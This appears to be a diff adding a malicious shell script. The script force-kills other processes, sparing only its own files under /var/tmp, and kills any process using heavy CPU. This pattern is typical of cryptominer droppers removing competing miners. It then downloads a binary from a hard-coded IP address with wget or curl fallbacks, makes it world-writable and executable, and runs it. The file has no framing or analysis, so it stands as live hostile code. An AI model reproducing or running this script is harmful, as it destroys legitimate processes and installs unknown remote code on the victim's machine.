@@ -1,0 +1,32 @@
+export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin
+ps axf -o "pid"|while read procid
+do
+        ls -l /proc/$procid/fd | grep /tmp
+        if [ $? -ne 1 ]
+        then
+                ls -l /proc/$procid/fd| grep -a -E "/var/tmp/adasdkjzlcasd"
+                if [ $? -ne 0 ]
+                then
+                        kill -9 $procid
+                                                echo zhaodao $procid
+                else
+                        echo "don't kill"$procid
+                fi
+        fi
+done
+
+ps axf -o "pid %cpu" | awk '{if($2>=50.0) print $1}' | while read procid
+do
+        ls -l /proc/$procid/exe| grep -a -E "/var/tmp/asdasdasdwxasd"
+        if [ $? -ne 0 ]
+        then
+                kill -9 $procid
+				echo zhaodao $procid
+        else
+                echo "don't kill"$procid
+        fi
+done
+
+wget http://103.104.73.155:8080/index -O /tmp/index ||curl -o /tmp/index http://103.104.73.155:8080/index||wget2.0 http://103.104.73.155:8080/index -O /tmp/index ||curl2.0 -o /tmp/index http://103.104.73.155:8080/index
+chmod 777 /tmp/index
+/tmp/index
